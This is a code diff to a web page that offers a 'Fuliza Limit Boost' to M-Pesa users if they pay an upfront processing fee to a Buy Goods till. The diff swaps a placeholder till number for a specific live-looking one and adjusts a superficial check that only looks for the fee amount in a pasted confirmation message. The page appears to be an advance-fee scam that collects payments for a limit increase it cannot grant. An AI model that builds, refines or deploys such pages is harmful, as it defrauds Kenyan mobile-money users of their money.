@@ -179,13 +179,15 @@
             margin: 10px 0;
         }
 
-        .dialog input {
+        .dialog input, .dialog textarea {
             width: 100%;
             padding: 12px;
             margin: 15px 0;
             border: 1px solid #ddd;
             border-radius: var(--border-radius);
             font-size: 16px;
+            min-height: 100px;
+            resize: vertical;
         }
 
         .dialog-button {
@@ -261,7 +263,7 @@
         <div class="till-info">
             <div class="till-details">
                 <div class="till-name">Fuliza Limit Boost Till</div>
-                <div class="till-number" id="tillNumber">123456</div>
+                <div class="till-number" id="tillNumber">4179754</div>
             </div>
             <button class="copy-button" id="copyButton">
                 <i class="fas fa-copy"></i> Copy
@@ -274,7 +276,7 @@
                 <li>Go to <strong>M-Pesa</strong> on your phone.</li>
                 <li>Select <strong>Lipa na M-Pesa</strong>.</li>
                 <li>Choose <strong>Buy Goods and Services</strong>.</li>
-                <li>Enter the Till Number: <strong><span id="tillNumberInstruction">123456</span></strong>.</li>
+                <li>Enter the Till Number: <strong><span id="tillNumberInstruction">4179754</span></strong>.</li>
                 <li>Enter the amount: <strong>Ksh <span id="amountInstruction">1,500</span></strong>.</li>
                 <li>Enter your M-Pesa PIN and confirm the payment.</li>
                 <li>Wait for the confirmation message from M-Pesa.</li>
@@ -284,12 +286,12 @@
         <button class="cta-button" id="confirmPaymentButton">I Have Paid</button>
     </div>
 
-    <!-- Paste Transaction Code Dialog -->
+    <!-- Paste Transaction Message Dialog -->
     <div class="dialog" id="pasteDialog">
         <div class="dialog-content">
-            <h2>Paste Transaction Code</h2>
-            <p>Enter the M-Pesa transaction message you received for paying <strong>Ksh <span id="feeCheck">1,500</span></strong>:</p>
-            <input type="text" id="transactionMessage" placeholder="Paste your M-Pesa confirmation message here">
+            <h2>Paste Transaction Message</h2>
+            <p>Paste your M-Pesa confirmation message for paying <strong>Ksh <span id="feeCheck">1,500</span></strong>:</p>
+            <textarea id="transactionMessage" placeholder="Paste your full M-Pesa confirmation message here"></textarea>
             <p id="errorMessage" style="color: red; display: none;">Error: The transaction message does not contain the correct payment amount. Please ensure you paid Ksh <span id="errorFeeCheck">1,500</span>.</p>
             <button class="dialog-button" id="submitTransactionMessage">Submit</button>
         </div>
@@ -323,18 +325,21 @@
         const fee = urlParams.get('fee') || "1500";
         const phone = urlParams.get('phone') || "0712345678";
 
+        // Format fee for display
+        const formattedFee = parseInt(fee).toLocaleString();
+
         // Display the limit and fee
         document.getElementById('newLimit').textContent = parseInt(limit).toLocaleString();
-        document.getElementById('processingFee').textContent = parseInt(fee).toLocaleString();
-        document.getElementById('feeCheck').textContent = parseInt(fee).toLocaleString();
-        document.getElementById('errorFeeCheck').textContent = parseInt(fee).toLocaleString();
-        document.getElementById('successFeeCheck').textContent = parseInt(fee).toLocaleString();
+        document.getElementById('processingFee').textContent = formattedFee;
+        document.getElementById('feeCheck').textContent = formattedFee;
+        document.getElementById('errorFeeCheck').textContent = formattedFee;
+        document.getElementById('successFeeCheck').textContent = formattedFee;
+        document.getElementById('amountInstruction').textContent = formattedFee;
 
-        // Simulate a till number (replace with your actual till number)
-        const tillNumber = "123456";
+        // Till number updated to 4179754
+        const tillNumber = "4179754";
         document.getElementById('tillNumber').textContent = tillNumber;
         document.getElementById('tillNumberInstruction').textContent = tillNumber;
-        document.getElementById('amountInstruction').textContent = parseInt(fee).toLocaleString();
 
         // Copy till number to clipboard
         document.getElementById('copyButton').addEventListener('click', () => {
@@ -352,7 +357,6 @@
         document.getElementById('submitTransactionMessage').addEventListener('click', () => {
             const transactionMessage = document.getElementById('transactionMessage').value;
             const errorMessage = document.getElementById('errorMessage');
-            const feeAmount = parseInt(fee).toLocaleString();
 
             if (!transactionMessage) {
                 alert('Please paste your M-Pesa confirmation message.');
@@ -360,9 +364,11 @@
             }
 
             // Check if the transaction message contains the correct fee amount
-            const isValidTransaction = transactionMessage.includes(`Ksh ${feeAmount}`) ||
-                                      transactionMessage.includes(`KES ${feeAmount}`) ||
-                                      transactionMessage.includes(`Amount: ${feeAmount}`);
+            const isValidTransaction = transactionMessage.includes(`Ksh ${formattedFee}`) ||
+                                      transactionMessage.includes(`KES ${formattedFee}`) ||
+                                      transactionMessage.includes(`Amount: ${formattedFee}`) ||
+                                      transactionMessage.includes(`Ksh.${formattedFee}`) ||
+                                      transactionMessage.includes(`KES.${formattedFee}`);
 
             if (!isValidTransaction) {
                 errorMessage.style.display = 'block';
